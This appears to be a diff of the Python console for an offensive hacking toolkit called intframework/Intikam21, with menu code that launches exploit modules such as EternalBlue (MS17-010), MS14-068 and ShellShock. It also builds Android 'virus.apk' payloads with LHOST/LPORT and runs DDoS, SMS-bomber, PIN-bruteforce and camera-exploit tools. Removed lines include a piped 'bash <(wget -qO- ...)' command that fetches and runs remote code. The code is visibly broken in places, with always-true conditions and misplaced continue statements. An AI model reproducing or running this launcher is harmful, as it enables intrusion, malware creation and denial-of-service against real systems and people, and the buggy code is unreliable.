     if help_input.lower().startswith("set lhost" or "set lhosts=" or "set lhost="):
     	t.sleep(1)
     	global LHOST
@@ -1068,7 +655,9 @@ Examples:
     ]
     		if selected in payloads:
     			PAYLOAD = payloads
-    		get_input(modulename="payload")
+    		else:
+    			print(f"[{Fore.RED}iNtBaSe{Fore.RESET}] {payloads} not found")
+    		get_input(modules=PAYLOAD, modulename="payload")
     	if use_h.startswith("evasions/"):
     		PATH = use_h[9:]
     		if PATH:
@@ -1084,27 +673,49 @@ Examples:
     				   pass
     			else:
     				pass 			
-    	if use_h.startswith("exploit/"):
-    		exp_tr = help_input[12:]
-    		result = exploits(exp_tr)
-    		if result.stdout == "multi/handler" or "multi/inthacker":
-    			print("multi/handler mode")
-    			global handler
-    			handler = "used"
+    	if use_h.startswith("intframework/modules/exploits/"):
+    		exp_tr = help_input[help_input.find("exploits/"):]
+    		if exp_tr == "multi/handler" or "/multi/handler":
     			get_input(modules="/multi/handler", modulename="exploit")
+    		if exp_tr == "gwn7000":
+    			get_input(modules="gwn7000", modulename="exploit")
+    		if exp_tr == "CollectID":
+    			get_input(modules="CollectID", modulename="exploit")
+    		if exp_tr == "DiamondFox":
+    			get_input(modules="DiamondFox", modulename="exploit")
+    		if exp_tr == "CVE-2018-6389":
+    			get_input(modules="CVE-2018-6389", modulename="exploit")
+    		if exp_tr == "CVE-2006":
+    			get_input(modules="CVE-2006", modulename="exploit")
+    		if exp_tr == "CVE-2016-3074":
+    			get_input(modules="CVE-2016-3074", modulename="exploit")
+    		if exp_tr == "MS14-068":
+    			get_input(modules="MS14-068", modulename="exploit")
+    		if exp_tr =="ShellShock":
+    			get_input(modules="ShellShock", modulename="exploit")
+    		if exp_tr == "MS17-010":
+    			get_input(modules="MS17-010", modulename="exploit")
+    		if exp_tr == "DiamondFox":
+    			get_input(modules="DiamondFox", modulename="exploit")
+    		if exp_tr == "DropleGanger":
+    			get_input(modules="DropleGanger", modulename="exploit")
+    		if exp_tr == "":
+    			get_input(modules="CVE-2006", modulename="exploit")
+    		if exp_tr == "CVE-2006":
+    			get_input(modules="CVE-2006", modulename="exploit")
+    		if exp_tr == "CVE-2006":
+    			get_input(modules="CVE-2006", modulename="exploit")
+    		if exp_tr == "CVE-2006":
+    			get_input(modules="CVE-2006", modulename="exploit")
+    		# CVE2018-10561 gpon_rce.py
     		else:
-    			if "-o" or ">" in help_input:
-    				if "-o" in help_input:
-    					output = help_input[help_input.find("-o"):]
-    				if ">" in help_input:
-    					exploit_ch = help_input[help_input.find(">"):]
-    			output = help_input[help_input.find("-o"):]
-    			s = os.getcwd()
-    			os.system("cd ~ && cd intframework && cd modules")
-    			os.system("python3 exploit_searcher.py "+exp_tr+ "-o"+output)
-    			get_input(modules=exp_tr, modulename="exploit")
+    			continue
     	if use_h.lower() == "shodan":
     		get_input(cdn="shodan")
+    	if use_h.lower() == "attack":
+    		get_input(cdn="attack")
+    	if use_h.lower() == "drones" or "intdrones":
+    		get_input(cdn="intdrones")
     	if use_h.lower() == "auxiliary":
     		get_input(cdn="auxiliary")
     		axe = "used"
@@ -1138,6 +749,8 @@ Examples:
         mailfinder
         specialintikam21youtube.py
             """ + Fore.RESET)
+    else:
+    	pass
     if help_input.startswith("select"):
     	h  = help_input[7:]
     	if h.lower() == "doshack":
@@ -1191,7 +804,72 @@ Examples:
     			""")
     		    except:
     		    	print()
-    		    	
+    if help_input == "show examples":
+    	print("""
+    	For Examples:
+		use command using auxiliary:
+			use auxiliary
+		selecting dirs example(if use auxiliary) else (use exploits or payloads or other tools):
+			select {Your selecting module)
+RUN
+=======
+	For Example:
+		run shodan
+		if you are set domain or others and use shodan following commands:
+			use shodan
+			set API={YourApiKey}
+			or set API {YourApiKey}
+			set mail=yourinfo@example.com
+			or
+			set DOMAİN=google.com
+			else
+			you are must using arguments or back else set other arguments for shodan
+		finally:
+			run
+Examples:
+    others enter a documents,
+    # Entering Modules:
+    	usage:
+    		use modules (Your Path)
+    	# example:
+    		set other=127.0.0.1
+    		use modules /intframework/modules/intcrawler/
+    		run
+    	""")
+    if help_input == "show exploits":
+    	print("""
++------------------------------------------------------------------------+
+|                           EXPLOİTS                                    |
++------------------------------------------------------------------------+
+| /intframework/modules/exploits/MS17-010/      |
+| /intframework/modules/exploits/CVE-2006/       |
+| /intframework/modules/exploits/CVE-2018-6389/       |
+| /intframework/modules/exploits/CVE-2016-3074/       |
+| /intframework/modules/exploits/CamExploit2/       |
+| /intframework/modules/exploits/CollectID/           |
+| /intframework/modules/exploits/DiamondFox/           |
+| /intframework/modules/exploits/DropleGanger/        |
+| /intframework/modules/exploits/HydraPwn/           |
+| /intframework/modules/exploits/IE-AURORA/           |
+| /intframework/modules/exploits/MS14-068/            |
+| /intframework/modules/exploits/ShellShock/        |
+| /intframework/modules/exploits/TorCT-Shell/      |
+| /intframework/modules/exploits/WifiToolInstaller/    |
+| /intframework/modules/exploits/gwn700/              |
+| /intframework/modules/exploits/se0wned/              |
+| /intframework/modules/exploits/se0wned/              |
+| /intframework/modules/exploits/Brainpan-Exploit.py/   |
+| /intframework/modules/exploits/Httproxyscan.py/ |
+| /intframework/modules/exploits/carpwned.py/    |
+| /intframework/modules/exploits/php_carpwn.py/     |
+| /intframework/modules/exploits/CrashCast/           |
+| /intframework/modules/exploits/DropleGanger/         |
+| /intframework/modules/exploits//       |
+| /intframework/modules/exploits/CVE2018-10561/       |
+| /intframework/modules/exploits/Fuzzering/           |
+| /intframework/modules/exploits/ac68.py/             |
++------------------------------------------------------------------------+
+    	""")
     if help_input.startswith("set evasions"):
     	global evasion_h
     	evasion_h = help_input[13:]
@@ -1213,81 +891,9 @@ Examples:
     				pass	
     	else:
     		print(Fore.RED + "No used evasion" + Fore.RESET + """please use "use evasion" """)
-    if help_input.startswith("int install"):
-    	int_i = help_input[12:]
-    	if int_i == "intai":
-    		print("Get 1: Searching intconsole modules...")
-    		print("intbase: succesfully installed intai")
-    	if int_i == "RHOST":
-    		global installed_rh
-    		print("Get 1: Searching intconsole modules...")
-    		print("intbase: module founded")
-    		print("Getting RHOST")
-    		installed_rh = "installed"
-    		print("intbase: succesfully installed Rhost")
-    	if int_i == "RPORT":
-    		global installed_rp
-    		print("Get 1: Searching intconsole modules...")
-    		print("intbase: module founded")
-    		print("Getting RHOST")
-    		installed_rp = "installed"
-    		print("intbase: succesfully installed Rport")
-    	if int_i == "ninja":
-    		global installed_nj
-    		print("Get 1: Searching intconsole modules")
-    		print("module not" + Fore.RED + "Founded" + Fore.RESET)	
-    		print("Get 2: Searching Repo")
-    		print("Getting ninja...")
-    		installed_nj = "installed"
-    		print("Succesfully installed ninja")
-    	if int_i == "aiv3":
-    		print("Get 1: Searching intconsole modules")
-    		print("module not" + Fore.RED + "Founded" + Fore.RESET)	
-    		print("Get 2: Searching Repo")	
-    		print("module not" + Fore.RED + "Founded" + Fore.RESET)
-    		print("Get 3: Searching All websites/repos")
-    		print("getting aiv3")
-    		print(Fore.RED + "[*]" + Fore.RESET + "Getting Repo")
-    		os.system("git clone https://github.com/Capsize-Games/chatai")
-    		s = input("Do you use ai?")
-    		if s.lower() == "y" or "YES":
-    			os.system("""
-    			cd chatai
-    			cd src
-    			cd chatairuner
-    			python3 chatbot.py
-    			""")
-    		else:
-    			pass
     if help_input.startswith("set banner"):
     	bannerss = help_input[12:] or help_input[15:]
-    	banner += [bannerss]
-    if help_input.lower().startswith(("set rhosts", "set rhosts=")):
-    	if help_input.lower().startswith("set rhosts="):
-    	   rhost = help_input[11:]  # "set rhosts=" 11 karakter uzunluğunda, 10'dan itibaren dilimlemek gerekiyor
-    	else:
-    	   rhost = help_input[10:]
-    	global RHOSTS
-    	RHOSTS = rhost
-    	print("intbase: RHOSTS ==> " + RHOSTS)
-
-    if help_input.lower().startswith(("set rport", "set rport=")):
-        if help_input.lower().startswith("set rport="):
-        	rprt = help_input[10:]  # "set rport=" 10 karakter uzunluğunda, 9'dan itibaren dilimlemek gerekiyor
-        else:
-        	rprt = help_input[10:]
-        global RPORT
-        RPORT = rprt
-        print("intbase: RPORTS ==> " + RPORT)
-    elif help_input.startswith("py-search" or "payload-search") and help_input.endswith("''"):
-    	    if help_input.startswith("payload-search '") and help_input.endswith("'"):
-    	    	term = user_input[len("payload-search '"):-1]
-    	    	result = search_payloads(term)
-    	    	print_payloads(result)
-    	    else:
-    	    	term = user_input[len("py-search '"):-1]
-    	    	result = search_payloads(term)
-    	    	print_payloads(result)    
+    	banner += [bannerss]   
     elif help_input.startswith("search '") and help_input.endswith("'"):
 	   # Extract module name from user input
         query = help_input[8:-1]  # Remove "search'" prefix and "'" suffix to get the module name
@@ -1384,92 +990,116 @@ Examples:
     		try:
     			intmodules.intmail(other)
     		except NameError:
-    			print("please set mail example: set other=info@example.com")
-    			pass
     			pass
     		get_input(modules="intmail", modulename="intmodules")
     	else:
-    		print("please set mail example: set other=info@example.com")
+    		pass
     	if module_name == "/intframework/modules/intcrawler" or "/intframework/modules/intcrawler/":
     		try:
     			intmodules.crawl(other)
     		except NameError:
-    			print("please set ip example: set other=127.0.0.1")
     			pass
     		get_input(modules="intcrawler", modulename="intmodules")
     	else:
-    		print("please set ip example: set other=127.0.0.1")
     		pass
     	if module_name == "/intframework/modules/imeicheck" or "/intframework/modules/imeicheck/":
     		try:
     			intmodules.imeicheck(other)
     		except NameError:
-    			print("please set imei example: set other=11111111111")
     			pass
     		get_input(modules="imeichecker", modulename="intmodules")
     	else:
-    		print("please set imei example: set other=11111111111")
+    		pass
     	if module_name == "/intframework/modules/phonesearch" or "/intframework/modules/phonesearch/":
     		try:
     			intmodules.phonesearch(other)
     		except NameError:
-    			print("please set phone number example: set other=5550000000")
     			pass
     		get_input(modules="phonesearcher", modulename="intmodules")
     	else:
-    		print("please set phone number example: set other=5550000000")
+    		pass
     	if module_name == "/intframework/modules/discord" or "/intframework/modules/discord/":
     		try:
     			intmodules.discord(other)
     		except NameError:
-    			print("please set id example: set other=1234567890")
     			pass
     		get_input(modules="intdiscord", modulename="intmodules")
     	else:
-    		print("please set id example: set other=1234567890")
+    		pass
+    else:
+    	continue
     if help_input.startswith("show options"):
     	framework = import_framework()
     	if use_framework(framework, exploit_name):
     		option = None
     		value = None
     		set_option(framework['current_exploit'], option, value)
+    	else:
+    		continue
+    	if get_input(cdn="osint&int"):
+    		print(f"""
+ Module       Hosts      Required     Description
+--------------    ------------   ------------------ ----------------------
+ OSİNT        {LHOST if LHOST else None}   No    Osint tools
+                   {LPORTS if LPORTS else None}
+    		""")
+    	else:
+    		continue
+    	if get_input(modulename="exploit", modules="/multi/handler"):
+    		handlerunner.multi_handler.options(LHOSTS if LHOSTS else None)
+    	else:
+    		continue
     	if intmodules.intmail(other) or get_input(modules="intmail", modulename="intmodules"):
     		try:
     			intmodules.mail_options(other, required=None)
     		except NameError:
-    			pass
-    			pass
+    			continue
     	else:
-    		pass
+    		continue
     	if intmodules.crawl(other) or get_input(modules="intcrawler", modulename="intmodules"):
     		try:
     			intmodules.crawl_option(other, required=None)
     		except NameError:
-    			pass
-    			pass
+    			continue
     	else:
-    		pass
+    		continue
     	if intmodules.imeicheck(other) or get_input(modules="imeichecker", modulename="intmodules"):
     		try:
     			intmodules.imeicheck_option(other)
     		except NameError:
-    			pass
+    			continue
     	else:
-    		pass
+    		continue
     	if intmodules.phonesearch(other) or get_input(modules="phonesearcher", modulename="intmodules"):
     		try:
     			intmodules.phonesearch_options(other)
     		except NameError:
-    			pass
+    			continue
     	else:
     		pass
     	if intmodules.discord(other) or get_input(modules="intdiscord", modulename="intmodules"):
     		try:
     			intmodules.discord_option(other)
     		except NameError:
-    			pass
+    			continue
     	else:
-    		pass
+    		continue
+    	if get_input(cdn=None, modules=None, modulename=None) or get_input():
+    		print("""
+  MODULE      HOSTS    REQUIRED     DESCRİPTİON
+ -----------------   -------------- -------------------  -----------------------                
+    None         {LHOST if LHOST else None}  None      normal console
+                      {LPORTS if LPORTS else None}
+                          		""")
+    	else:
+    		continue
+    else:
+    	print("""
+  MODULE      HOSTS    REQUIRED     DESCRİPTİON
+ -----------------   -------------- -------------------  -----------------------                
+    None         {LHOST if LHOST else None}  None      normal console
+                      {LPORTS if LPORTS else None}
+                          		""")
     if help_input.lower().startswith("intninja"):
     	hel = help_input[9:]
     	s = os.getcwd()
@@ -1555,63 +1185,13 @@ Examples:
     		os.system("cd ~ && cd intframework && cd modules")
     		os.system("python3 intcrawler.py {hel}" if hel else "python3 intcrawler.py.")
     		os.system(f"cd {s}")
-    if help_input.lower().startswith("show"):
-    	hr = help_input[help_input.find("show "):]
-    	if hr.lower() == "tools" or "tool":
-    		print("""
-    				140 Tools:
-			1-) DDOS
-			2-) SMSBOMBER
-			3-DİSCORD
-			4-)METASPLOİT
-			5-)İNTİKAM21
-			6-)iptracker
-			7-)youtube-hack
-			8-)Send email
-			9-)OSINT Framework
-	SPECİAL:	
-			----------------------------------------------
-			| [10]android-pin-bruteforce |
-			-----------------------------------------------
-		[11] bruteforce 
-		[12]update
-		+90 tools: [13]
-		+35 tools: [intshark]
-		[14]social hack
-		[Oip]using oip -h
-		[inTrojan] using introjan -h
-    		""")
-    	if hr.lower() == "exploits" or "exploit":
-    		print("""
-    	exploit usage: exp-number
-		Exploits:
-			[1]-Exploit Database 
-			[2]-MSFVENOM
-			[3]-MSFCONSOLE
-			[4]-NMAP
-			[5]-TRAİTOR
-			[6]-facebook-id-collector			
-			
-			SPECİAL:
-			---------------------------------------------
-		   |. [7]-youtube -------- exploit    |
-		   |	[8]-phonesploit	  			|
-		   |	[9]-camera exploit			 |
-		   |	 [10]-camexp2				   |
-			---------------------------------------------	
-			
-			
-			[11] EMAIL FINDER
-			[12]-others command: intvenom
-			[13]-others command: intvenom
-			[14]-others command: intvenom
-			[15]-others command: intvenom
-    		""")
     if help_input.lower().startswith("run"):
     	get_run = help_input[4:]
     	if use_framework(framework, exploit_name) or get_run == 'exploit':
     		framework = import_framework()
     		run_exploit(framework['current_exploit'])
+    	else:
+    		continue
     	if get_input(cdn="shodan") or get_input(modulename="shodan") or get_run == "shodan":
     		stripting = help_input[help_input.lower().find("bset domain=") + len("bset domain="):].lower().strip() if "Domain" in help_input else ""
     		api = help_input[help_input.lower().find("bset api=") + len("bset api="):].lower().strip() if "bset api=" in help_input else ""
@@ -1622,11 +1202,85 @@ Examples:
     			os.system(f"cd {s}")
     		except:
     			print("Seems like you're hitting a wrong API or not routing your IP properly. Make sure your endpoints are legit and your IP config is on point.")
+    			continue
+    	else:
+    		continue
     	get = help_input[10:]
     	if get_input(cdn="auxiliary" or cdn.startswith("auxiliary/")):
     		get = help_input[10:]
     		if get_input(cdn).startswith("auxiliary/"):
     		    get = help_input[11:]
+    	else:
+    		continue
+    	if get_input(modulename="exploit", modules="/multi/handler"):
+    		print(f"""
+ TARGET      REQUIRED     DESCRİPTİON
+========    =========   =============
+  {LHOST if LHOST else None} No  creating viruses
+  {LPORTS if LPORTS else None}
+    		""")
+    		print("[*] creating...")
+    		os.system("python3 inthandler.py")
+    		print("[*] Sending...")
+    		try:
+    			os.system(f"python3 intvenom.py LHOST={LHOST if LHOST else None} LPORT={LPORTS if LPORTS else None} --original-apk intframework-virus.apk --output-apk virus.apk")
+    			print("[+] Sended and created")
+    		except Exception as e:
+    			print("[-] {e}")
+    			continue # .pass to continue
+    	else:
+    		continue
+    	if get_input(modulename="exploit", modules="DiamondFox"):
+    		print(f"""
+ TARGET      REQUIRED     DESCRİPTİON
+========    =========   =============
+  {LHOST if LHOST else None} Yes    Exploit
+  {LPORTS if LPORTS else None}
+    		""")
+    		print("[*] getting path...")
+    		s = os.getcwd()
+    		print("[*] entering...")
+    		os.system("cd ~ && cd intframework && cd modules && cd exploits && cd DiamondFox")
+    		print("[*] running")
+    		os.system("python3 diamondpwn.py {LHOSTS}")
+    		print("[+] runned!")
+    		os.system(f"cd {s}")
+    		continue
+    	else:
+    		continue
+    	if get_input(modules="MS17-010", modulename="exploit"):
+    		print(f"""
+ TARGET      REQUİRED    DESCRİPTİON
+========   =========  =============
+{LHOSTS if LHOSTS else None}    No     REMOTİNG
+    		""")
+    		s = os.getcwd()
+    		os.system("cd ~ && cd intframework && cd modules && cd exploits && cd MS17-010")
+    		os.system("python3 eternalblue.py")
+    		os.system(f"cd {s}")
+    	else:
+    		continue
+    	if get_input(modulename="exploit", modules="MS14-068"):
+    		print(f"""
+ TARGET      REQUİRED    DESCRİPTİON
+========   =========  =============
+{LHOSTS if LHOSTS else None}    No    Leak
+    		""")
+    		s = os.getcwd()
+    		os.system("cd ~ && cd intframework && cd modules && cd exploits && cd MS14-068")
+    		os.system("python ms14068.py")
+    	else:
+    		continue
+    	if get_input(modulename="exploit", modules="ac68.py"):
+    		s = os.getcwd()
+    		print(f"""
+ TARGET      REQUİRED    DESCRİPTİON
+========   =========  =============
+{LHOSTS if LHOSTS else None}    No    hacking
+    		""")    		
+    		os.system("cd ~ && cd intframework && cd modules && python ac68.py {LHOST if LHOST else None} {LPORTS if LPORTS else None} && cd {s}")
+    	else:
+    		continue
     	if get.lower() == "dos":
     		stripting = help_input[help_input.find("select") + len("select"):].strip() if "select" in help_input else ""
     		if stripting == "dos.py":
@@ -1638,6 +1292,8 @@ Examples:
     			cd DoShAcK
     			python Doshack.py
     			""")
+    	else:
+    		continue
     	if get.lower() == "social-enginering":
     		if get_input(cdn="auxiliary/social-enginering"):
     			get1 = get_input[get_input().find("auxoliary/social-enginering"):]
@@ -1646,8 +1302,9 @@ Examples:
     				os.system("python3 DISCORD.py")
     	else:
     		t.sleep(0.2)
+    		continue
     elif help_input.lower().startswith("back"):
-    	get_input()	
+    	get_input()
     elif help_input.lower().startswith("info" or "get-help"):
     	global info_get
     	if help_input.lower().startswith("info"):
@@ -1658,18 +1315,18 @@ Examples:
     		print("invalid argument detected")
     	if info_get.lower() == "dns":
     		print("""
-    		usage:
-    			
-    			Commands           Function
-    			==========         ========    			
-    			DHOST= 			  İP OR HOST
-    			-f (Format)   >>    formatting dns example modules: txt, mx, ns, a
-    			DPORT
-    			
-    			example:
-    				dns DHOST=127.0.0.1:90 -f txt
-    				dns DHOST=127.0.0.1 DPORT=90 -f mx
-    			""")
+            usage:
+        
+            Commands           Function
+            ==========         ========              
+            DHOST=             İP OR HOST
+            -f (Format)   >>    formatting dns example modules: txt, mx, ns, a
+            DPORT
+        
+            example:
+                dns DHOST=127.0.0.1:90 -f txt
+                dns DHOST=127.0.0.1 DPORT=90 -f mx
+                """)
     		if info_get.lower() == "connect":
     			print("""
     			usage: connect CHOST=(HOST) CPORT=(PORT)
@@ -1703,7 +1360,10 @@ Examples:
     		    payloads       using payloads
     		    auxiliary        using auxiliary modules
     		    shodan          using shodan
-    		    osint             using osint
+    		    osint              using osint
+    		    attack            intikam21 attack modules
+    		    drones           using intdrones
+    		    scanners       using scanner
     		    
     		    example:
     		    	use modules /intframework/modules/intcrawler/
@@ -1715,147 +1375,25 @@ Examples:
     		listen(ip_chef)
     	if ip_chef and port_chef:
     		listen_p(ip_chef, port_chef)
+    else:
+    	try:
+    		pass
+    	except:
+    		continue
     if help_input.startswith("searchuser"):
     	if get_input(cdn="osint&int"):
     		hel = help_input[help_input.find("searchuser "):]
     		s = os.getcwd()
     		os.system("cd ~ && cd intframework && cd modules")
-    		os.system("python3 searchuser.py"+hel if hel else "python3 searchuser.py")
+    		os.system("python3 searchuser.py "+hel if hel else "python3 searchuser.py")
     		os.system(f"cd {s}")
     	else:
     		os.system(help_input)
-    if help_input == "t-1":
-    	if get_input(cdn="osint&int"):
-    		os.system("python3 DDOS.py")
-    elif help_input == "t-3":
-    	if get_input(cdn="osint&int"):
-    		os.system("python3 DİSCORD.py")
-    elif help_input == "t-2":
-    	if get_input(cdn="osint&int"):
-    		os.system("python3 SMSBOMBER.py")
-    elif help_input == "t-4":
-    	time.sleep(1)
-    	print("termux [y] kali [n]")
-    	k = input("Do you using [termux/kali] ?")
-    	if k == "y" or "Y" or "termux" or "Termux" or "TERMUX":
-    		os.system("pkg update -y && pkg upgrade -y && apt update -y && apt upgrade -y")
-    		os.system("pkg install wget -y")
-    		os.system("wget https://github.com/gushmazuko/metasploit_in_termux/raw/master/metasploit.sh")
-    		os.system("chmod +x metasploit.sh")
-    		os.system("./metasploit.sh")
-    	elif k == "n" or "N" or "kali" or "Kali" or "KALİ":
-    		os.system("sudo apt-get install metasploit-framework")
-    		os.system("msfconsole")
-    elif help_input == "t-5":
-    	if get_input(cdn="osint&int"):
-    		os.system("""apt update & apt upgrade
-sudo apt install git
-sudo apt install python3-pyfiglet
-sudo apt install python3 
-sudo apt install python3-base64
-sudo apt install python3-colorama
-sudo apt install python3-requests
-
-git clone https://github.com/Intikam21kurucu/Intikam21
-
-cd Intikam21
-
-python3 Intıkam21.py""")
-    elif help_input == "exp-1":
-    	if get_input(cdn="osint&int"):
-    		print("the exploit is not working ")
-    elif help_input == "exp-2":
-    	try:
-    		os.system("msfconsole")
-    	except:
-    		os.system("sudo apt-get install meta sploit-framework")
-    elif help_input == "exp-3":
-    	try:
-    		os.system("msfvenom")
-    	except:
-    		os.system("sudo apt-get install metasploit-framework")
-    elif help_input == "exp-4":
-    	try:
-    		os.system("pip install nmap")
-    		os.system("nmap")
-    	except:
-    		os.system("sudo apt-get install nmap")
-    elif help_input == "exit":
-    	print("Bye bye / yine bekleriz ")
-    	os.system("exit")
-    	break
-    elif help_input == "t-6":
-    	if get_input(cdn="osint&int"):
-    		os.system("python3 iptracker.py")
-    elif help_input == "exp-5":
-    	if get_input(cdn="osint&int"):
-    		os.system("""git clone https://github.com/liamg/traitor
-		cd traitor
-		traitor -p -e docker:writable-socket			
-		""")
-    elif help_input == "exit":
-    	print("exiting console...")
-    	time.sleep(2)
-    	os.system("exit")
-    elif help_input == "exp-6":
-    	if get_input(cdn="osint&int"):
-    		os.system("python2 id-collector.py")
-    elif help_input == "exp-7":
-    	if get_input(cdn="osint&int"):
-    		os.system("python3 specialintikam21youtube.py")
-    elif help_input == "exp-8":
-    	if get_input(cdn="osint&int"):
-    		os.system("""
-    	git clone https://github.com/AzeemIdrisi/PhoneSploit-Pro.git
-    	cd PhoneSploit-Pro/
-    	pip install -r requirements.txt
-    	python3 phonesploitpro.py
-    	""")
-    elif help_input == "exp-9":
-    	if get_input(cdn="osint&int"):
-    		os.system("python expcamera.py")
-    elif help_input == "exp-10":
-    	s = input ("Do yo want to continue [y/n]")
-    	if s == "y":
-    		if get_input(cdn="osint&int"):
-    			os.system("python3 camexp2.py")
-    		else:
-    			pass
-    	elif s == "n":
-    		print("restarting...")
-    		time.sleep(3)
-    		os.system("python3 intconsoleV4.py")
-    elif help_input == "t-7": 
-    	os.system("""
-		git clone https://github.com/in4osecurity/Youtube-Hack
-		cd Youtube-Hack
-		bash kurulum.sh		
-		""")
-    elif help_input == "t-8":
-    	if get_input(cdn="osint&int"):
-    		s = os.getcwd()
-    		os.system("cd ~ && cd intframework && cd modules")
-    		os.system("python3 sendemail.py")
-    		os.system(f"cd {s}")
-    elif help_input == "t-9":
-    	s = os.getcwd()
-    	os.system("cd ~ && cd intframework && cd modules")
-    	os.system("python3 osint.py")
-    	os.system(f"cd {s}")
-    elif help_input == "exp-11":
-    	os.system("python3 emailfinder.py")
-    elif help_input == "t-10":
-    	s = input("do you want to continue? [y/n]")
-    	if s == "y":
-    		os.system("""			
-			git clone https://github.com/urbanadventurer/Android-PIN-Bruteforce
-			cd Android-PIN-Bruteforce
-			./android-pin-bruteforce crack --length 6				
-			""")
-    	elif s == "n":
-    		print("restarting...")
-    		time.sleep(3)
-    		os.system("python3 intconsoleV4.py")
+    if help_input.startswith("intserver"):
+    	if "--autoupdate" in help_input:
+    		os.system("python3 update.py")
+    	if "shot" in help_input:
+    		os.system(f"python3 shotgun.py LHOST={LHOST if LHOST else None} LPORT={LPORTS if LPORTS else None} bytes=200000")
     elif help_input == "banner":
     	banner()
     	menu_banner()
@@ -1889,227 +1427,21 @@ python3 Intıkam21.py""")
 			""")
     elif help_input == "anim-exit":
     	s = os.getcwd()
-    	os.system("cd ~ && cd intframework && cd modules")
+    	try:
+    		os.system("cd ~ && cd intframework && cd modules")
+    	except:
+    		pass
     	os.system("python3 intly.py")
     	os.system(f"cd {s}")
     	exit() 
     else:
-    	exit()	   
-    if help_input == "mode-admin":
-    	print("you are admin mode :)")
-    	os.system("clear")
-    	banner()
-    	menu_banner()
-    	admin_input = input("""
-		┌──(intikam21-cyber@root[admin]
-		└─$""")
-    	add_job("admin_mode")
-    	if admin_input == "set -a admin$Off":
-    		print("adding set")
-    		t.sleep(2)
-    		print("offed a set$ADMİN")
-    		break
-    		exit()
-    		os.system("intconsole")
-    	if admin_input == "set -a admin$Name '{user_name}'":
-    		global user_name
-    		print("Now you are name is: "+user_name)
-    	if admin_input == "set -a admin$WHOAMİ":
-    		global whoami
-    		whoami = user_name
-    		user_name = getpass.getuser()
-    		print(user_name)
-    	if admin_input == "set -a admin$RAUNT {name} {command}":
-    		global command
-    		global namesr
-    		os.system("touch "+namesr)
-    		os.system("nano "+namesr)
-    		os.system(command)
-    		os.system("source "+namesr)
-    		global list
-    		list = [f"""
-			140 Tools:
-			1-) DDOS
-			2-) SMSBOMBER
-			3-DİSCORD
-			4-)METASPLOİT
-			5-)İNTİKAM21
-			6-)iptracker
-			7-)youtube-hack
-			8-)Send email
-			9-)OSINT Framework
-	SPECİAL:	
-			----------------------------------------------
-			| [10]android-pin-bruteforce |
-			-----------------------------------------------
-		[11] bruteforce 
-		[12]update
-		+90 tools: [13]
-		+35 tools: [intshark]
-		[14]social hack
-		[Oip]using oip -h
-		[inTrojan] using introjan -h
-		[{name}] using {name} -h
-		"""]
-    	if admin_input == "set -a admin$HELP":
-    		print(list)
-    	if admin_input == "set -a admin$RASSN":
-    		print("RAT SET SELECT NOTEPAD")
-    		os.system("introjan -h")
-    	if admin_input == "use {u_name}":
-    		global u_name
-    		u_name = ["intikam21-framework", "metasploit-framework", "Hunner-Framework", "Katana-Framework", "Osint-Framework", "RecoTak-Framework", "Zkit-FRAMEWORK", "On-The-Go-FRAMEWORK", "Cage-FRAMEWORK"]
-    		if u_name == "Cage-FRAMEWORK":
-    			os.system("bash <(wget -qO- https://bit.ly/3ilzOl9)")
-    			os.system("git clone https://github.com/xzendercage/cageframework")
-    			os.system("cd cageframework")
-    			os.system("python cageframework.py")
-    		if u_name == "On-The-Go-FRAMEWORK":
-    			os.system("git clone https://github.com/Aoshee/onTHEgo")
-    			os.system("cd onTHEgo")
-    			os.system("pip install -r REQUIREMENTS")
-    			os.system("python onTHEgo.py")
-    		if u_name == "Zkit-FRAMEWORK":
-    			os.system("git clone git clone https://github.com/000Zer000/ZKit-Framework")
-    			os.system("cd Zkit-Framework")
-    			os.system("pip install -r requirements.txt")
-    		if u_name == "RecoTak-FRAMEWORK":
-    			os.system("git clone https://github.com/recotak/recotak-framework.git && cd recotak && sh install.sh")
-    		if u_name == "Osint-FRAMEWORK":
-    			os.system("""
-				git clone https://github.com/TermuxHackz/X-osint
-				cd X-osint
-				#3) Grant permissions and run install file
-				chmod +x *
-				bash setup.sh
-				""")
-    		if u_name == "Katana-Framework" or "Katana-FRAMEWORK":
-    			os.system("""
-				git clone https://github.com/PowerScript/KatanaFramework.git
-				cd KatanaFramework
-				sh dependencies
-				python install
-				""")
-    		if u_name == "Hunner-Framework" or "Hunner-FRAMEWORK":
-    			os.system("git clone https://github.com/b3-v3r/Hunner")
-    			os.system("cd Hunner")
-    			os.system("python3 hunner.py")
-    		if u_name == "metasploit-framework" or "Metasploit-Framework" or "Metasploit-FRAMEWORK":
-    			os.system("msfconsole")
-    		else:
-    			os.system("pkg update -y && pkg upgrade -y && apt update -y && apt upgrade -y")
-    			os.system("pkg install wget -y")
-    			os.system("wget https://github.com/gushmazuko/metasploit_in_termux/raw/master/metasploit.sh")
-    			os.system("chmod +x metasploit.sh")
-    			os.system("./metasploit.sh")
-    		if u_name == "intikam21-framework" or "İntikam21-Framework" or "intikam21-FRAMEWORK" or "İNTİKAM21-FRAMEWORK":
-    			exit()
-    			os.system("intconsole")
-    		else:
-    			os.system("""
-				cd ~
-				rm -rf intframework
-				git clone https://github.com/Intikam21kurucu/intframework
-				cd intframework
-				chmod +x terbuild.sh
-				./terbuild.sh
-    			""")
-    if help_input.startswith("build"):
-        print("please to use parses ")
-        if help_input in "-v":
-        	print("do you continue?")
-        	print("we have no responsibility")
-        	s = input("Do you want to continue?")
-        	if s.lower() == "n":
-        		exit()
-        	if s.lower() == "Y":
-        		pass
-        		os.system("""			
-			git clone https://github.com/Cyber-Dioxide/Virus-Builder/
-			cd Virus-Builder
-			ls
-			pip install -r requirements.txt
-			python3 Builder.py
-			""")
-        else:
-        	print("please create virus")
-        if help_input in "-b" or "--build":
-        	os.system("sh build.sh")
-        if help_input in "-apk" or "--apk":
-        	os.system("sh apkbuild.sh")
-        	add_job("virus apk building") and add_jb("virus")
-        else:
-        	print("please to use argparse or chat with intai!")
-		
-    if help_input == f"item {moduleastr}":
-    	global using_module
-    	global s_name
-    	global p_name
-    	global pyc_name
-    	global r_name
-    	global h_name
-    	global php_name
-    	using_module = [f"{s_name}.sh", f"{p_name}.py", f"{pyc_name}.pyc", f"{r_name}.ruby", f"{h_name}.html", f"{php_name}.php"]
-    	if module not in using_module:
-    		print("<> module not finded <>")
-    	if module == "{s_name}.sh":    			
-    		os.system("sh {s_name}.sh")
-    	if module == "{p_name}.py":
-    		os.system("python {p_name}.py")
-    	if module == "{pyc_name}.pyc":
-    		os.system("pyc {pyc_name}.pyc")
-    	if module == "{r_name}.ruby":
-    		os.system("ruby {r_name}.ruby")
-    	if module == "{h_name}.html":
-    		os.system("html {h_name}.html")
